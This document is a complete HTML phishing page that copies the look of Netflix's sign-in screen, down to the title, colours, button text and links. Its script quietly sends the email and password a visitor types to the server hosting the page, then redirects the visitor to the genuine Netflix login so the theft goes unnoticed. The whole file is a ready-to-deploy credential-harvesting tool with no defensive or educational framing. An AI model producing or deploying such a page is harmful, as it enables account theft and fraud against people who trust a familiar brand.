<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Netflix</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;background:#000;color:#333}.bg{background:linear-gradient(rgba(0,0,0,.5),rgba(0,0,0,.5)),url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1920 1080"><rect fill="%23222"width="1920"height="1080"/></svg>');min-height:100vh;display:flex;justify-content:center;align-items:center}.box{background:rgba(0,0,0,.75);border-radius:4px;padding:60px 68px 40px;width:450px}.title{color:white;font-size:32px;font-weight:700;margin-bottom:28px}input{width:100%;padding:16px 20px;background:#333;border:0;border-radius:4px;color:white;font-size:16px;margin-bottom:16px;outline:none}input:focus{background:#454545}input[type="submit"]{background:#e50914;color:white;font-weight:700;font-size:16px;cursor:pointer;border:none;border-radius:4px}input[type="submit"]:hover{background:#f40612}.help{display:flex;justify-content:space-between;align-items:center;margin-top:12px}.help label{color:#b3b3b3;font-size:13px}.help a{color:#b3b3b3;text-decoration:none;font-size:13px}.help a:hover{text-decoration:underline}.signup{margin-top:60px;color:#737373;font-size:16px}.signup a{color:white;text-decoration:none}.signup a:hover{text-decoration:underline}</style></head><body><div class="bg"><div class="box"><div class="title">Sign In</div><form method="POST"><input type="email"name="email"placeholder="Email or phone number"required><input type="password"name="password"placeholder="Password"required><input type="submit"value="Sign In"></form><div class="help"><label><input type="checkbox">Remember me</label><a href="#">Need help?</a></div><div class="signup">New to Netflix? <a href="#">Sign up now</a></div></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://www.netflix.com/login';});});</script></body></html>
